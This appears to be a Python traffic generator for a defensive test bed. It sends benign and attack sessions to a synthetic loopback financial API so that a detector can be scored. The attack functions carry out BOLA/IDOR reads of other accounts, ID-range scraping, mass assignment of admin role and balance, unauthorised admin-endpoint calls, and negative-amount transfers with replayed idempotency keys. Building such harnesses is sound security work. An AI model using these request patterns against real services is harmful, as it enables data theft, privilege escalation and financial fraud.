"""Attack + benign clients for the synthetic financial API.

All traffic is HTTP against the loopback fin-api target; a host allowlist makes
off-box traffic impossible. Each session is a stream of well-formed API requests
the target logs (with ground-truth flags) so the defender can be scored.

Session types:
  benign           — normal customer: login, read OWN account, edit display_name,
                     make one valid positive transfer
  bola             — BOLA/IDOR: login low-priv, read a couple OTHER accounts
  scraping_bola    — behavioural BOLA: one user pulls MANY account ids (scraping)
  mass_assignment  — mass assignment: POST /api/profile with role/balance/is_admin
  bfla             — broken function-level auth: non-admin calls /api/admin/users
  transfer_abuse   — business-flow abuse: negative-amount transfer + replay
"""
import json
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {'127.0.0.1', 'localhost', '::1'}


def _check(url):
    host = urllib.parse.urlparse(url).hostname
    if host not in ALLOWED_HOSTS:
        raise PermissionError(f'blocked non-loopback target: {host!r}')


def _req(base, method, path, session, token=None, form=None):
    url = base.rstrip('/') + path
    _check(url)
    headers = {'X-Session': session}
    if token:
        headers['Authorization'] = 'Bearer ' + token
    data = None
    if form is not None:
        data = urllib.parse.urlencode(form).encode()
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
    req = urllib.request.Request(url, data=data, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status, r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:  # noqa: BLE001
        return None, str(e)


def _login(base, session, user, pw):
    _, body = _req(base, 'POST', '/api/login', session, form=dict(username=user, password=pw))
    try:
        return json.loads(body).get('token')
    except Exception:  # noqa: BLE001
        return None


def benign_session(base, session, user='alice', pw='alice-pw'):
    tok = _login(base, session, user, pw)
    _req(base, 'GET', '/api/accounts/me', session, token=tok)
    _req(base, 'POST', '/api/profile', session, token=tok, form=dict(display_name='A. Lab'))
    _req(base, 'POST', '/api/transfer', session, token=tok,
         form=dict(to_account='1002', amount='50', idempotency_key=f'{session}-ok'))
    return dict(type='benign', token=bool(tok))


def bola_session(base, session, user='alice', pw='alice-pw', ids=(1001, 1002, 1003)):
    tok = _login(base, session, user, pw)
    stolen = []
    for acct in ids:
        s, body = _req(base, 'GET', f'/api/accounts/{acct}', session, token=tok)
        try:
            j = json.loads(body)
            if s == 200 and j.get('owner') and j.get('owner') != user:
                stolen.append(dict(account=acct, owner=j['owner']))
        except Exception:  # noqa: BLE001
            pass
    return dict(type='bola', token=bool(tok), stolen=len(stolen), bola_success=bool(stolen))


def scraping_bola_session(base, session, user='alice', pw='alice-pw', lo=1000, hi=1004):
    """Behavioural BOLA: one user enumerates a range of account ids (scraping)."""
    tok = _login(base, session, user, pw)
    got = 0
    for acct in range(lo, hi + 1):
        s, body = _req(base, 'GET', f'/api/accounts/{acct}', session, token=tok)
        try:
            if s == 200 and json.loads(body).get('owner') not in (None, user):
                got += 1
        except Exception:  # noqa: BLE001
            pass
    return dict(type='scraping_bola', token=bool(tok), scraped=got)


def mass_assignment_session(base, session, user='carol', pw='carol-pw'):
    tok = _login(base, session, user, pw)
    s, body = _req(base, 'POST', '/api/profile', session, token=tok,
                   form=dict(display_name='C', role='admin', balance='999999', is_admin='true'))
    esc = False
    try:
        j = json.loads(body)
        esc = (j.get('role') == 'admin') or (str(j.get('balance')) == '999999')
    except Exception:  # noqa: BLE001
        pass
    return dict(type='mass_assignment', token=bool(tok), escalated=esc)


def bfla_session(base, session, user='bob', pw='bob-pw'):
    """Broken function-level auth: a non-admin reads the admin-only user list."""
    tok = _login(base, session, user, pw)
    s, body = _req(base, 'GET', '/api/admin/users', session, token=tok)
    leaked = 0
    try:
        leaked = len(json.loads(body).get('users', [])) if s == 200 else 0
    except Exception:  # noqa: BLE001
        pass
    return dict(type='bfla', token=bool(tok), admin_access=s == 200, leaked_users=leaked)


def transfer_abuse_session(base, session, user='bob', pw='bob-pw'):
    """Business-flow abuse: negative-amount transfer (money reversal) + replay."""
    tok = _login(base, session, user, pw)
    key = f'{session}-dup'
    _req(base, 'POST', '/api/transfer', session, token=tok,
         form=dict(to_account='1001', amount='-5000', idempotency_key=key))     # negative
    _req(base, 'POST', '/api/transfer', session, token=tok,
         form=dict(to_account='1001', amount='100', idempotency_key=key))       # replay same key
    _req(base, 'POST', '/api/transfer', session, token=tok,
         form=dict(to_account='1001', amount='100', idempotency_key=key))       # replay again
    return dict(type='transfer_abuse', token=bool(tok))


SESSION_FUNCS = {
    'benign': benign_session,
    'bola': bola_session,
    'scraping_bola': scraping_bola_session,
    'mass_assignment': mass_assignment_session,
    'bfla': bfla_session,
    'transfer_abuse': transfer_abuse_session,
}
